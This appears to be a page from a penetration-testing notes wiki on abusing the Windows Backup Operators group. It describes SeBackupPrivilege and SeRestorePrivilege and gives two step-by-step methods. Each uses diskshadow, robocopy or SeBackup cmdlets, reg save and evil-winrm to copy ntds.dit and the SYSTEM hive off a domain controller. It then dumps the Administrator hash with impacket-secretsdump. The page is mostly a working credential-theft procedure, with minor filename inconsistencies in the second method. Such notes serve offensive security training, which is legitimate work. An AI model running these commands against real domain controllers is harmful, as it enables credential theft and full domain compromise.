---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Backup Operators

## Information

Backup Operators can **back up and restore all files on a computer**, including OS files, regardless of the permissions that protect those files. Because members of this group can replace files on DCs, they're considered **service administrators**.

> Well known SID/RID: `S-1-5-32-551`.

<table><thead><tr><th width="205">Privilege</th><th>Description</th></tr></thead><tbody><tr><td><a href="https://learn.microsoft.com/en-us/windows/device-security/security-policy-settings/back-up-files-and-directories">SeBackupPrivilege</a></td><td>Allows us to create backups of any files, whilst not restoring their permissions, which equals to <strong>arbitrary read access</strong>.</td></tr><tr><td><a href="https://learn.microsoft.com/en-us/windows/device-security/security-policy-settings/restore-files-and-directories">SeRestorePrivilege</a></td><td>Allows us to <strong>overwrite legitimate executable files</strong> with versions that include malicious software used for <strong>privilege escalation</strong>.</td></tr></tbody></table>

## Exploitation

### Dumping ntds.dit

#### Method 1

Create a [**diskshadow**](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow) script from the attack host to expose the `c:` drive.

{% code overflow="wrap" %}
```bash
# creating a diskshadow script
nano diskshadow_script
# listing its content
cat diskshadow_script
set context persistent nowriters
add volume c: alias random
create
expose %random% z:
# converting file into a Windows-compatible format
$ sudo unix2dos diskshadow_script
unix2dos: converting file diskshadow_script to DOS format...
```
{% endcode %}

[Transfer](../../../tools/file-transfers.md) the script to the target host and execute the following steps. In the example below, `evil-winrm` is used to transfer the files between the attack and the target host, via its `upload` and `download` methods.

```powershell
# move within a writeable directory
cd c:\windows\temp
# upload the diskshadow script
upload diskshadow_script
# expose the shadow copy
diskshadow /s diskshadow_script
# copy the ntds.dit database
robocopy /b z:\windows\ntds . ntds.dit
# copy the system.hive file
reg save hklm\system c:\windows\temp\system.hive
# download both files
download ntds.dit
download system.hive
```

Dump the `ntds.dit` from the attack host.

{% code overflow="wrap" %}
```bash
# dump the ntds.dit data and extract the administrator's hash
impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL | grep Administrator
```
{% endcode %}

For an example of the above method check [here](../../../boxes/hard/blackfield.md#exfiltrating-victory).

#### Method 2

Download the `SeBackupPrivilegeUtils.dll` and `SeBackupPrivilegeCmdLets.dll` from [here](https://github.com/giuliano108/SeBackupPrivilege) on the attack host and transfer them to the target along with the diskshadow script ([Method 1](backup-operators.md#method-1))  (on the example below `evil-winrm` is used).

```powershell
# move to a writeable directory
cd C:\Temp
# upload files
upload diskshadow_script
upload SeBackupPrivilegeUtils.dll
upload SeBackupPrivilegeCmdLets.dll
# import DLLs into memory
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
# expose the shadow copy
diskshadow /s raj.dsh
```

Unlike [Method 1](backup-operators.md#method-1), this time we will be using the `Copy-FileSebackupPrivilege` cmdlet (part of the DLL files) to copy the `ntds.dit` file from the `z:` volume to the `Temp` directory.

```powershell
# copy ntds.dit to Temp
Copy-FileSebackupPrivilege z:\Windows\NTDS\ntds.dit C:\Temp\ntds.dit
# copy system.hive
reg save hklm\system c:\Temp\system
# exfiltrate files
download ntds.dit
download system
```

Dump the `ntds.dit` from the attack host.

```bash
# dump the ntds.dit data and extract the administrator's hash
impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL | grep Administrator
```

## Resources

{% tabs %}
{% tab title="Backup Operators" %}
{% embed url="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#backup-operators" %}
{% endtab %}

{% tab title="SeBackup" %}
{% embed url="https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/" %}
{% endtab %}
{% endtabs %}
